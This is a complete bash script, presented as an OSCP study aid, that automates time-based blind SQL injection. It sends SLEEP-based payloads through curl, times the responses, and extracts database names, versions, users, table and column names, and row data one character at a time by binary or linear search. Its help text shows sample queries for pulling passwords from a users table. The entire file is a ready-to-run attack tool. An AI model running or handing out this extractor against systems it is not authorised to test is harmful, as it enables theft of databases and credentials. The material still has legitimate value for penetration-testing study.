#!/bin/bash

#########################################################################################
# Time-Based SQL Injection Data Extractor - OSCP Educational Tool
# Author: OSCP Student Toolkit
# Version: 2.0
# Purpose: Educational tool for understanding and exploiting time-based SQL injections
#########################################################################################

# Color codes for verbose output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Default configuration
TARGET_URL=""
PARAM_NAME=""
INJECTION_POINT=""
DELAY_TIME=2
VERBOSE=1
METHOD="POST"
EXTRACTION_MODE="auto"
MAX_LENGTH=100
COOKIE=""
HEADERS=""

# Statistics tracking
TOTAL_REQUESTS=0
START_TIME=$(date +%s)
SUCCESSFUL_CHARS=0

#########################################################################################
# HELPER FUNCTIONS
#########################################################################################

print_banner() {
    echo -e "${CYAN}${BOLD}"
    echo "╔══════════════════════════════════════════════════════════════════╗"
    echo "║        Time-Based SQL Injection Extractor - OSCP Toolkit         ║"
    echo "║                   Educational Exploitation Tool                  ║"
    echo "╚══════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_usage() {
    cat << EOF
${BOLD}Usage:${NC}
    $0 -u TARGET_URL -p PARAM_NAME -i INJECTION_POINT [OPTIONS]

${BOLD}Required Arguments:${NC}
    -u URL          Target URL
    -p PARAM        Parameter name (e.g., 'mail-list', 'id')
    -i INJECTION    SQL injection point (e.g., "test' AND IF({CONDITION},SLEEP($DELAY_TIME),0)-- -")

${BOLD}Optional Arguments:${NC}
    -m METHOD       HTTP method (GET/POST) [default: POST]
    -d DELAY        Sleep delay in seconds [default: 2]
    -c COOKIE       Cookie header value
    -H HEADERS      Additional headers (format: "Header1: Value1|Header2: Value2")
    -M MODE         Extraction mode (auto/manual/binary/linear) [default: auto]
    -L LENGTH       Maximum string length to check [default: 100]
    -v              Verbose mode (shows all attempts)
    -q              Quiet mode (minimal output)
    -h              Show this help message

${BOLD}Extraction Modes:${NC}
    auto    - Automatic database, table, and column enumeration
    manual  - Interactive mode with custom queries
    binary  - Binary search method (fastest for known queries)
    linear  - Linear character-by-character (educational)

${BOLD}Examples:${NC}
    # Basic POST injection
    $0 -u http://target.com/index.php -p "mail-list" \\
       -i "test' AND IF({CONDITION},SLEEP(2),0)-- -"

    # GET injection with cookie
    $0 -u http://target.com/page.php -p "id" -m GET \\
       -i "1 AND IF({CONDITION},SLEEP(3),0)" -c "PHPSESSID=abc123"

    # Manual mode for custom queries
    $0 -u http://target.com/index.php -p "mail-list" \\
       -i "test' AND IF({CONDITION},SLEEP(2),0)-- -" -M manual

${BOLD}Educational Notes:${NC}
    This tool demonstrates time-based SQL injection exploitation techniques
    for OSCP exam preparation. It includes:
    - Binary search optimization (7 requests vs 37+ linear)
    - ASCII value extraction for any character set
    - Database enumeration methodology
    - Performance metrics and timing analysis

EOF
}

log_verbose() {
    if [ $VERBOSE -eq 1 ]; then
        echo -e "${YELLOW}[VERBOSE]${NC} $1"
    fi
}

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

show_progress() {
    local current=$1
    local total=$2
    local width=50
    local percentage=$((current * 100 / total))
    local filled=$((width * current / total))

    printf "\r${CYAN}Progress: ["
    printf "%${filled}s" | tr ' ' '='
    printf "%$((width - filled))s" | tr ' ' '-'
    printf "] %d%% (%d/%d)${NC}" $percentage $current $total
}

#########################################################################################
# SQL INJECTION TESTING FUNCTIONS
#########################################################################################

test_condition() {
    local condition="$1"
    local injection="${INJECTION_POINT//\{CONDITION\}/$condition}"

    TOTAL_REQUESTS=$((TOTAL_REQUESTS + 1))

    log_verbose "Testing condition: $condition"
    log_verbose "Full injection: $injection"

    local start=$(date +%s%N)

    if [ "$METHOD" == "POST" ]; then
        response_time=$(curl -X POST "$TARGET_URL" \
            -d "${PARAM_NAME}=${injection}" \
            ${COOKIE:+-H "Cookie: $COOKIE"} \
            ${HEADERS:+-H "$HEADERS"} \
            -s -w "%{time_total}" -o /dev/null 2>/dev/null)
    else
        response_time=$(curl -X GET "${TARGET_URL}?${PARAM_NAME}=${injection}" \
            ${COOKIE:+-H "Cookie: $COOKIE"} \
            ${HEADERS:+-H "$HEADERS"} \
            -s -w "%{time_total}" -o /dev/null 2>/dev/null)
    fi

    local end=$(date +%s%N)
    local elapsed=$(( (end - start) / 1000000 ))

    log_verbose "Response time: ${response_time}s (${elapsed}ms)"

    # Check if delay occurred (with 0.5s tolerance)
    if (( $(echo "$response_time > ($DELAY_TIME - 0.5)" | bc -l) )); then
        log_verbose "✓ Condition TRUE (delayed response)"
        return 0
    else
        log_verbose "✗ Condition FALSE (quick response)"
        return 1
    fi
}

#########################################################################################
# STRING EXTRACTION METHODS
#########################################################################################

# Binary search method for ASCII extraction
extract_char_binary() {
    local query="$1"
    local position="$2"
    local low=32
    local high=126
    local mid
    local attempts=0

    log_verbose "Extracting character at position $position using binary search"

    while [ $low -le $high ]; do
        mid=$(( (low + high) / 2 ))
        attempts=$((attempts + 1))

        log_verbose "Binary search: Testing ASCII > $mid (range: $low-$high)"

        if test_condition "ASCII(SUBSTRING(($query),$position,1))>$mid"; then
            low=$((mid + 1))
            log_verbose "Character ASCII > $mid, searching higher"
        else
            high=$mid
            log_verbose "Character ASCII <= $mid, searching lower"
        fi

        if [ $low -eq $high ]; then
            local char=$(printf "\\$(printf '%03o' $low)")
            log_verbose "Found character: '$char' (ASCII: $low) in $attempts attempts"
            printf "%s" "$char"
            SUCCESSFUL_CHARS=$((SUCCESSFUL_CHARS + 1))
            return 0
        fi
    done

    return 1
}

# Linear search method (educational - shows inefficiency)
extract_char_linear() {
    local query="$1"
    local position="$2"
    local charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@.-"
    local attempts=0

    log_verbose "Extracting character at position $position using linear search"

    for (( i=0; i<${#charset}; i++ )); do
        char="${charset:$i:1}"
        ascii=$(printf '%d' "'$char")
        attempts=$((attempts + 1))

        log_verbose "Linear search: Testing '$char' (ASCII: $ascii)"

        if test_condition "ASCII(SUBSTRING(($query),$position,1))=$ascii"; then
            log_verbose "Found character: '$char' in $attempts attempts"
            printf "%s" "$char"
            SUCCESSFUL_CHARS=$((SUCCESSFUL_CHARS + 1))
            return 0
        fi
    done

    return 1
}

# Extract complete string
extract_string() {
    local query="$1"
    local max_len="${2:-$MAX_LENGTH}"
    local method="${3:-binary}"
    local result=""
    local length=0

    echo -e "\n${BOLD}Extracting: ${NC}$query"

    # Find string length first
    log_info "Finding string length..."
    for len in $(seq 1 $max_len); do
        show_progress $len $max_len
        if test_condition "LENGTH(($query))=$len"; then
            length=$len
            echo
            log_success "String length: $len characters"
            break
        fi
    done

    if [ $length -eq 0 ]; then
        echo
        log_error "Could not determine string length (may be empty or > $max_len)"
        return 1
    fi

    # Extract each character
    log_info "Extracting characters..."
    echo -n "Result: ${GREEN}"

    for pos in $(seq 1 $length); do
        if [ "$method" == "binary" ]; then
            char=$(extract_char_binary "$query" "$pos")
        else
            char=$(extract_char_linear "$query" "$pos")
        fi

        result="${result}${char}"
        echo -n "$char"
    done

    echo -e "${NC}"
    echo -e "${BOLD}Complete string: ${GREEN}$result${NC}"

    return 0
}

#########################################################################################
# DATABASE ENUMERATION
#########################################################################################

enumerate_database() {
    echo -e "\n${CYAN}${BOLD}═══ Database Enumeration ═══${NC}"

    # Current database
    log_info "Extracting current database name..."
    extract_string "SELECT DATABASE()" 50

    # Version
    log_info "Extracting MySQL version..."
    extract_string "SELECT VERSION()" 30

    # Current user
    log_info "Extracting current user..."
    extract_string "SELECT USER()" 50
}

enumerate_tables() {
    local database="${1:-}"

    echo -e "\n${CYAN}${BOLD}═══ Table Enumeration ═══${NC}"

    if [ -z "$database" ]; then
        read -p "Enter database name: " database
    fi

    # Count tables
    log_info "Counting tables in $database..."
    for count in $(seq 1 50); do
        if test_condition "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='$database'=$count"; then
            log_success "Found $count tables"

            # Extract each table name
            for i in $(seq 0 $((count-1))); do
                log_info "Extracting table $((i+1))/$count..."
                extract_string "SELECT table_name FROM information_schema.tables WHERE table_schema='$database' LIMIT $i,1" 50
            done
            break
        fi
    done
}

enumerate_columns() {
    local database table

    echo -e "\n${CYAN}${BOLD}═══ Column Enumeration ═══${NC}"

    read -p "Enter database name: " database
    read -p "Enter table name: " table

    # Count columns
    log_info "Counting columns in $database.$table..."
    for count in $(seq 1 50); do
        if test_condition "(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='$database' AND table_name='$table')=$count"; then
            log_success "Found $count columns"

            # Extract each column name
            for i in $(seq 0 $((count-1))); do
                log_info "Extracting column $((i+1))/$count..."
                extract_string "SELECT column_name FROM information_schema.columns WHERE table_schema='$database' AND table_name='$table' LIMIT $i,1" 50
            done
            break
        fi
    done
}

extract_data() {
    local database table columns where_clause=""

    echo -e "\n${CYAN}${BOLD}═══ Data Extraction ═══${NC}"

    read -p "Enter database name: " database
    read -p "Enter table name: " table
    read -p "Enter column names (comma-separated): " columns
    read -p "Enter WHERE clause (optional): " where_clause

    # Count rows
    log_info "Counting rows..."
    local count_query="SELECT COUNT(*) FROM $database.$table"
    [ -n "$where_clause" ] && count_query="$count_query WHERE $where_clause"

    for count in $(seq 1 100); do
        if test_condition "($count_query)=$count"; then
            log_success "Found $count rows"

            # Extract data from each row
            IFS=',' read -ra col_array <<< "$columns"

            for row in $(seq 0 $((count-1))); do
                echo -e "\n${BOLD}Row $((row+1)):${NC}"

                for col in "${col_array[@]}"; do
                    col=$(echo $col | tr -d ' ')
                    log_info "Extracting $col..."

                    local query="SELECT $col FROM $database.$table"
                    [ -n "$where_clause" ] && query="$query WHERE $where_clause"
                    query="$query LIMIT $row,1"

                    extract_string "$query" 100
                done
            done
            break
        fi
    done
}

#########################################################################################
# INTERACTIVE MODE
#########################################################################################

manual_mode() {
    echo -e "\n${CYAN}${BOLD}═══ Manual Query Mode ═══${NC}"
    echo "Enter 'help' for command list, 'exit' to quit"

    while true; do
        echo
        read -p "SQL> " query

        case "$query" in
            exit|quit)
                break
                ;;
            help)
                cat << EOF
${BOLD}Available Commands:${NC}
    extract QUERY           - Extract string result from query
    test CONDITION          - Test if condition is true/false
    enum db                 - Enumerate databases
    enum tables DB_NAME     - Enumerate tables in database
    enum columns            - Enumerate columns (interactive)
    enum data               - Extract data (interactive)
    stats                   - Show session statistics
    exit                    - Exit manual mode

${BOLD}Example Queries:${NC}
    extract SELECT USER()
    extract SELECT password FROM users LIMIT 0,1
    test LENGTH(DATABASE())>5
    enum tables animal_planet
EOF
                ;;
            extract*)
                query="${query#extract }"
                extract_string "$query"
                ;;
            test*)
                condition="${query#test }"
                if test_condition "$condition"; then
                    log_success "Condition is TRUE"
                else
                    log_info "Condition is FALSE"
                fi
                ;;
            "enum db")
                enumerate_database
                ;;
            "enum tables"*)
                db="${query#enum tables }"
                enumerate_tables "$db"
                ;;
            "enum columns")
                enumerate_columns
                ;;
            "enum data")
                extract_data
                ;;
            stats)
                show_statistics
                ;;
            *)
                log_error "Unknown command. Type 'help' for available commands."
                ;;
        esac
    done
}

#########################################################################################
# AUTOMATIC ENUMERATION
#########################################################################################

auto_mode() {
    echo -e "\n${CYAN}${BOLD}═══ Automatic Enumeration Mode ═══${NC}"

    # Test injection point
    log_info "Testing injection point..."
    if test_condition "1=1"; then
        log_success "Injection point confirmed!"
    else
        log_error "Injection point not working. Check your parameters."
        exit 1
    fi

    # Enumerate database
    enumerate_database

    # Ask for database to enumerate
    read -p "Enter database name to enumerate (or press Enter to skip): " db_name
    if [ -n "$db_name" ]; then
        enumerate_tables "$db_name"

        # Ask for table to enumerate
        read -p "Enter table name to enumerate columns (or press Enter to skip): " table_name
        if [ -n "$table_name" ]; then
            enumerate_columns

            # Ask if user wants to extract data
            read -p "Extract data from this table? (y/n): " extract_choice
            if [ "$extract_choice" == "y" ]; then
                extract_data
            fi
        fi
    fi

    show_statistics
}

#########################################################################################
# STATISTICS AND REPORTING
#########################################################################################

show_statistics() {
    local end_time=$(date +%s)
    local duration=$((end_time - START_TIME))
    local minutes=$((duration / 60))
    local seconds=$((duration % 60))

    echo -e "\n${CYAN}${BOLD}═══ Session Statistics ═══${NC}"
    echo -e "${BOLD}Total Requests:${NC} $TOTAL_REQUESTS"
    echo -e "${BOLD}Successful Extractions:${NC} $SUCCESSFUL_CHARS characters"
    echo -e "${BOLD}Time Elapsed:${NC} ${minutes}m ${seconds}s"
    echo -e "${BOLD}Average Request Rate:${NC} $(( TOTAL_REQUESTS / (duration + 1) )) req/sec"
    echo -e "${BOLD}Efficiency:${NC} $(( SUCCESSFUL_CHARS * 100 / (TOTAL_REQUESTS + 1) ))% success rate"

    # Performance comparison
    echo -e "\n${YELLOW}${BOLD}Method Comparison:${NC}"
    echo "Binary Search: ~7 requests per character (optimal)"
    echo "Linear Search: ~37 requests per character (average)"
    echo "Your session: $((TOTAL_REQUESTS / (SUCCESSFUL_CHARS + 1))) requests per character"
}

#########################################################################################
# MAIN EXECUTION
#########################################################################################

main() {
    print_banner

    # Parse arguments
    while getopts "u:p:i:m:d:c:H:M:L:vqh" opt; do
        case $opt in
            u) TARGET_URL="$OPTARG" ;;
            p) PARAM_NAME="$OPTARG" ;;
            i) INJECTION_POINT="$OPTARG" ;;
            m) METHOD="$OPTARG" ;;
            d) DELAY_TIME="$OPTARG" ;;
            c) COOKIE="$OPTARG" ;;
            H) HEADERS="$OPTARG" ;;
            M) EXTRACTION_MODE="$OPTARG" ;;
            L) MAX_LENGTH="$OPTARG" ;;
            v) VERBOSE=1 ;;
            q) VERBOSE=0 ;;
            h) print_usage; exit 0 ;;
            *) print_usage; exit 1 ;;
        esac
    done

    # Validate required arguments
    if [ -z "$TARGET_URL" ] || [ -z "$PARAM_NAME" ] || [ -z "$INJECTION_POINT" ]; then
        log_error "Missing required arguments"
        print_usage
        exit 1
    fi

    # Display configuration
    echo -e "${BOLD}Configuration:${NC}"
    echo "  Target URL: $TARGET_URL"
    echo "  Parameter: $PARAM_NAME"
    echo "  Method: $METHOD"
    echo "  Delay Time: ${DELAY_TIME}s"
    echo "  Mode: $EXTRACTION_MODE"
    echo

    # Execute based on mode
    case "$EXTRACTION_MODE" in
        auto)
            auto_mode
            ;;
        manual)
            manual_mode
            ;;
        binary)
            read -p "Enter SQL query to extract: " query
            extract_string "$query" $MAX_LENGTH "binary"
            show_statistics
            ;;
        linear)
            read -p "Enter SQL query to extract: " query
            extract_string "$query" $MAX_LENGTH "linear"
            show_statistics
            ;;
        *)
            log_error "Invalid extraction mode: $EXTRACTION_MODE"
            exit 1
            ;;
    esac

    echo -e "\n${GREEN}${BOLD}Extraction complete!${NC}"
}

# Run main function if not sourced
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main "$@"
fi